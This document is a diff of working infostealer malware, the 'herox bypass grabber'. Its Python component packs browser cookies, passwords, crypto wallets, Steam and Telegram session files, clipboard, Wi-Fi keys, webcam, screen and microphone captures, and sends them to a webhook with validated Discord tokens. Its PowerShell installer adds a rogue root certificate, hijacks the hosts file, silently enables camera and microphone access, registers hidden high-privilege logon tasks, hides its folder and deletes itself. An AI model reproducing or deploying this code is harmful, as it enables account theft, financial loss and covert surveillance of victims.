+        z.writestr("roblox.txt", "\n".join(rb))
+        for name, p in WALLETS.items():
+            if not os.path.exists(p):
+                continue
+            if os.path.isfile(p):
+                if os.path.getsize(p) < 2097152:
+                    z.write(p, "wallets/%s_%s" % (name, os.path.basename(p)))
+            else:
+                for dp, dn, fn in os.walk(p):
+                    for f in fn:
+                        fp = os.path.join(dp, f)
+                        try:
+                            if os.path.getsize(fp) > 2097152:
+                                continue
+                            tot += os.path.getsize(fp)
+                            if tot > 12582912:
+                                break
+                            z.write(fp, "wallets/%s/%s" % (name, os.path.relpath(fp, p)))
+                        except Exception:
+                            pass
+        for m in MISC:
+            if os.path.exists(m) and os.path.getsize(m) < 524288:
+                z.write(m, "misc/" + os.path.basename(m))
+        steam = r"C:\Program Files (x86)\Steam\config"
+        if os.path.isdir(steam):
+            for f in os.listdir(steam):
+                if f.startswith("ssfn") or f == "loginusers.vdf":
+                    try:
+                        z.write(os.path.join(steam, f), "steam/" + f)
+                    except Exception:
+                        pass
+        td = os.path.join(AD, "Telegram Desktop", "tdata")
+        if os.path.isdir(td):
+            for dp, dn, fn in os.walk(td):
+                for f in fn:
+                    fp = os.path.join(dp, f)
+                    try:
+                        if os.path.getsize(fp) > 2097152:
+                            continue
+                        tot += os.path.getsize(fp)
+                        if tot > 18874368:
+                            break
+                        z.write(fp, "tdata/" + os.path.relpath(fp, td))
+                    except Exception:
+                        pass
+    return path, len([x for x in ck if not x.startswith("# ")]), len([x for x in pw if not x.startswith("# ")])
 
-    tokens = {}
-    for tok, src in found:
-        if tok not in tokens:
-            tokens[tok] = src
-    tokens = {k: v for k, v in tokens.items() if len(k) > 50}
-
+def report(tokens, sp, tag, files):
+    st = load_state()
+    known = st.setdefault("tokens", {})
     events, lines, users = [], [], []
     for tok, src in tokens.items():
-        key = h(tok)
+        key = hh(tok)
         info = validate(tok) or {}
         prev = known.get(key, {})
         if not prev:
@@ -598,62 +828,74 @@ def cycle():
                       "user": info.get("username"), "seen": int(time.time())}
         if info.get("valid"):
             users.append("%s (%s)" % (info.get("username"), info.get("id")))
-            lines.append("**VALID** `%s`\n> %s | %s | nitro %s | mfa %s\n> `%s`\n> %s"
+            lines.append("**VALID** `%s`\n> %s | %s | nitro %s | mfa %s | subs %s\n> `%s`\n> %s"
                          % (info.get("username"), info.get("id"), info.get("email") or "-",
-                            info.get("nitro"), info.get("mfa"), tok, src))
+                            info.get("nitro"), info.get("mfa"), info.get("subs", "?"), tok, src))
         else:
             lines.append("**%s** (HTTP %s)\n> `%s`\n> %s"
                          % ("INVALID" if info.get("valid") is False else "UNVERIFIED",
                             info.get("code", "?"), tok, src))
     save_state(st)
 
-    sp = specs()
-    em = emails()
-    ck = []
-    for name, ud in BROWSERS:
-        if os.path.isdir(ud):
-            ck += ["# %s" % name] + cookies(name, ud)
-    ck_path = os.path.join(DATA, "cookies.txt")
-    open(ck_path, "w", encoding="utf-8").write("\n".join(ck))
-    cam = camera()
-    voc = voice()
-
-    desc = "\n".join(lines)[:4000] or "ma l9itch tokens"
+    desc = "\n".join(lines)[:4000] or "no tokens"
     if events:
         desc = "**%s**\n\n" % ", ".join(sorted(set(events))) + desc
 
-    embeds = [{
-        "title": "%s | %s" % (host, ip),
+    e = {
+        "title": "%s | %s | %s" % (socket.gethostname(), sp.get("ip", "?"), tag),
         "description": desc,
         "color": 0x5865F2,
         "fields": [
-            {"name": "Device", "value": "`%s` | local %s | uptime %s min" % (host, local_ips(), sp.get("uptime", "?")), "inline": False},
+            {"name": "Device", "value": "`%s` | %s | %s | up %s min" % (socket.gethostname(), sp.get("local", "?"), sp.get("geo") or "-", sp.get("uptime", "?")), "inline": False},
             {"name": "Users", "value": (", ".join(users) or "-")[:1000], "inline": True},
-            {"name": "Emails", "value": ("\n".join(em) or "-")[:1000], "inline": True},
-            {"name": "WiFi", "value": "`%s`\nprofiles: %s" % (sp.get("wifi") or "-", (sp.get("profiles") or "-")[:600]), "inline": False},
+            {"name": "Emails", "value": ("\n".join(sp.get("emails", [])) or "-")[:1000], "inline": True},
+            {"name": "WiFi", "value": "`%s`" % ((sp.get("wifi_keys") or sp.get("wifi") or "-")[:900]), "inline": False},
             {"name": "Disks", "value": "`%s`" % (sp.get("disks") or "-"), "inline": False},
-            {"name": "Specs", "value": "CPU `%s`\nGPU `%s`\nRAM `%sGB`\n`%s`\n`%s`"
-                % (sp.get("cpu"), sp.get("gpu"), sp.get("ram_gb"), sp.get("mobo"), sp.get("os")), "inline": False},
-            {"name": "Cookies", "value": "`%d`" % (len(ck) - sum(1 for x in ck if x.startswith("# "))), "inline": True},
+            {"name": "Specs", "value": "CPU `%s`\nGPU `%s` %s\nRAM `%sGB`\n`%s`\n`%s`\nkey `%s`\nAV `%s`"
+                % (sp.get("cpu"), sp.get("gpu"), sp.get("res"), sp.get("ram_gb"), sp.get("mobo"),
+                   sp.get("os"), sp.get("key") or "-", sp.get("av") or "-"), "inline": False},
+            {"name": "Accounts", "value": "`%s`" % (sp.get("users") or "-"), "inline": False},
+            {"name": "Clipboard", "value": "`%s`" % ((sp.get("clip") or "-")[:900]), "inline": False},
+            {"name": "Loot", "value": "cookies `%s` | passes `%s` | history `%s`"
+                % (sp.get("ckn", 0), sp.get("pwn", 0), json.dumps(sp.get("hist", {}))), "inline": False},
         ],
         "footer": {"text": "herox bypass grabber • 30min"},
         "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
-    }]
+    }
+    send({"username": "herox bypass grabber", "avatar_url": AVATAR, "embeds": [e]}, files)
 
-    files = {}
-    if cam:
-        files["files[0]"] = ("cam.jpg", open(cam, "rb"))
-    if voc:
-        files["files[1]"] = ("voice.wav", open(voc, "rb"))
-    files["files[2]"] = ("cookies.txt", open(ck_path, "rb"))
+def cycle(deep=True):
+    t0 = time.time()
+    sp = sysinfo()
+    sp["ip"] = pub_ip()
+    sp["local"] = local_ips()
+    sp["geo"] = geo(sp["ip"])
+    sp["emails"] = emails()
+    sp["hist"] = histories()
 
-    send({"username": "herox bypass grabber", "avatar_url": AVATAR, "embeds": embeds}, files)
+    zp, sp["ckn"], sp["pwn"] = build_zip(sp)
+    files = {"files[0]": ("dump.zip", open(zp, "rb"))}
+    i = 1
+    for fn, nm in ((camera(), "cam.jpg"), (shot(), "screen.jpg"), (voice(), "voice.wav")):
+        if fn:
+            files["files[%d]" % i] = (nm, open(fn, "rb"))
+            i += 1
+
+    tokens = quick_tokens()
+    report(tokens, sp, "FIRST" if not os.path.exists(STATE) else "UPDATE", files)
     for f in files.values():
         try:
             f[1].close()
         except Exception:
             pass
-    log("cycle done in %ds, %d tokens" % (time.time() - t0, len(tokens)))
+
+    if deep:
+        more = {k: v for k, v in disk_scan(t0 + 150).items() if k not in tokens and len(k) > 50}
+        if more:
+            slim = {"ip": sp["ip"], "local": sp["local"], "geo": sp["geo"], "emails": sp["emails"],
+                    "hist": sp["hist"], "ckn": sp["ckn"], "pwn": sp["pwn"]}
+            report(more, slim, "DEEP", {})
+    log("cycle %ds tokens=%d ck=%d pw=%d" % (time.time() - t0, len(tokens), sp["ckn"], sp["pwn"]))
 
 def main():
     once = "--once" in sys.argv
@@ -671,49 +913,36 @@ if __name__ == "__main__":
 '@
 
 $utf8 = New-Object System.Text.UTF8Encoding($false)
-foreach ($pair in @(@('makecert.py',$makecert), @('run.py',$runner), @('fake.py',$fake), @('cam.ps1',$cam), @('grab.py',$grab))) {
+foreach ($pair in @(@('makecert.py',$makecert), @('run.py',$runner), @('fake.py',$fake), @('cam.ps1',$cam), @('screen.ps1',$screen), @('grab.py',$grab))) {
     [IO.File]::WriteAllText((Join-Path $Root $pair[0]), $pair[1], $utf8)
 }
 
-# ================= 03 - cert =================
-Write-Host '>> 03 cert' -ForegroundColor Cyan
 python makecert.py
 if (-not (Test-Path (Join-Path $Root 'seven.cer'))) { throw 'cert failed' }
 $c = Import-Certificate -FilePath (Join-Path $Root 'seven.cer') -CertStoreLocation 'Cert:\CurrentUser\Root'
-Write-Host "   trusted $($c.Thumbprint)" -ForegroundColor Green
+Write-Host "   cert $($c.Thumbprint)" -ForegroundColor Green
 
-# ================= 04 - hosts =================
-Write-Host '>> 04 hosts' -ForegroundColor Cyan
 Copy-Item $Hosts (Join-Path $Root 'hosts.bak') -Force
 (Get-Content $Hosts) | Where-Object { $_ -notmatch [regex]::Escape($Domain) } | Set-Content $Hosts
 Add-Content -Path $Hosts -Value "127.0.0.1 $Domain"
 ipconfig /flushdns | Out-Null
 
-# ================= 05 - consent cam/mic =================
-Write-Host '>> 05 consent cam/mic' -ForegroundColor Cyan
 foreach ($cap in 'webcam','microphone') {
     $k = "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\$cap"
     if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null }
     Set-ItemProperty -Path $k -Name 'Value' -Value 'Allow'
 }
-Write-Host '   Allow' -ForegroundColor Green
 
-# ================= 06 - launcher + icon =================
-Write-Host '>> 06 launcher' -ForegroundColor Cyan
 $ico = Join-Path $Root 'fakeauth.ico'
 try {
     Invoke-WebRequest -UseBasicParsing $IconUrl -OutFile (Join-Path $Root 'icon.jpg')
     Add-Type -AssemblyName System.Drawing
     $img = [System.Drawing.Image]::FromFile((Join-Path $Root 'icon.jpg'))
     $bmp = New-Object System.Drawing.Bitmap $img, 128, 128
-    $hicon = $bmp.GetHicon()
-    $icon = [System.Drawing.Icon]::FromHandle($hicon)
-    $fs = [IO.File]::Create($ico)
-    $icon.Save($fs)
-    $fs.Close()
+    $icon = [System.Drawing.Icon]::FromHandle($bmp.GetHicon())
+    $fs = [IO.File]::Create($ico); $icon.Save($fs); $fs.Close()
     $img.Dispose(); $bmp.Dispose()
-    Write-Host '   icon OK' -ForegroundColor Green
-} catch { Write-Host '   icon fail, bla icon' -ForegroundColor DarkYellow }
+} catch {}
 
 $cs = Join-Path $Root 'launch.cs'
 @"
@@ -728,8 +957,7 @@ class P {
     si.WorkingDirectory = dir;
     si.UseShellExecute = false;
     si.CreateNoWindow = true;
-    var p = Process.Start(si);
-    p.WaitForExit();
+    Process.Start(si).WaitForExit();
   }
 }
 "@ | Set-Content -Path $cs -Encoding UTF8
@@ -741,46 +969,32 @@ if (Test-Path $csc) {
     $cargs += $cs
     & $csc $cargs 2>&1 | Out-Null
 }
-if (-not (Test-Path $Launcher)) {
-    Write-Host '   csc fail -> pythonw direct' -ForegroundColor DarkYellow
-    Copy-Item $pyw $Launcher -Force
-    $Launcher = $pyw
-} else { Write-Host '   fakeauth.exe bni' -ForegroundColor Green }
+if (-not (Test-Path $Launcher)) { Copy-Item $pyw $Launcher -Force; $Launcher = $pyw }
 Remove-Item $cs -Force -ErrorAction SilentlyContinue
 
-# ================= 07 - tasks =================
-Write-Host '>> 07 tasks' -ForegroundColor Cyan
 $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
     -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) `
     -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew -DontStopOnIdleEnd
 $trigger = New-ScheduledTaskTrigger -AtLogOn -User "$env:USERDOMAIN\$env:USERNAME"
 
-foreach ($pair in @(@($TaskS,'run.py','auth service'), @($TaskG,'grab.py','auth update'))) {
+foreach ($pair in @(@('FakeAuth','run.py'), @('FakeAuthGrab','grab.py'))) {
     $act = New-ScheduledTaskAction -Execute $Launcher -Argument $pair[1] -WorkingDirectory $Root
     Register-ScheduledTask -TaskName $pair[0] -Action $act -Trigger $trigger -Settings $settings `
-        -Principal $principal -Description $pair[2] -Force | Out-Null
+        -Principal $principal -Force | Out-Null
 }
-Write-Host "   $TaskS + $TaskG msajjlin" -ForegroundColor Green
 
-Start-ScheduledTask -TaskName $TaskS
-Start-ScheduledTask -TaskName $TaskG
-Start-Sleep -Seconds 6
-
-# ================= 08 - hide =================
+Start-ScheduledTask -TaskName 'FakeAuth'
+Start-ScheduledTask -TaskName 'FakeAuthGrab'
+Start-Sleep -Seconds 5
 attrib +h +s $Root
-Write-Host '>> 08 folder hidden' -ForegroundColor Cyan
 
-# ================= verification =================
 Write-Host ''
-Write-Host '--- verification ---' -ForegroundColor Cyan
-foreach ($t in $TaskS, $TaskG) { Write-Host "   $t : $((Get-ScheduledTask -TaskName $t).State)" }
 if (Get-NetTCPConnection -LocalPort 443 -State Listen -ErrorAction SilentlyContinue) {
-    Write-Host '   port 443: LISTEN' -ForegroundColor Green
-} else { Write-Host '   port 443: MAKAYNCH — chouf C:\seven\server.log' -ForegroundColor Red }
-Start-Sleep -Seconds 3
-Get-Content (Join-Path $Root 'grabber.log') -Tail 6 -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "   $_" -ForegroundColor DarkGray }
-
+    Write-Host '   :443 LISTEN' -ForegroundColor Green
+} else { Write-Host '   :443 FAIL' -ForegroundColor Red }
+Start-Sleep -Seconds 2
+Get-Content (Join-Path $Root 'server.log') -Tail 3 -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "   $_" -ForegroundColor DarkGray }
 Write-Host ''
-Write-Host 'Salina. Server + grabber kaykhdmo hidden, kaytle3o f kol logon.' -ForegroundColor Green
-Write-Host 'L grabber kayb3et awal report daba, mn be3d kol 30min.' -ForegroundColor DarkGray
+Write-Host 'OK' -ForegroundColor Green
+Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
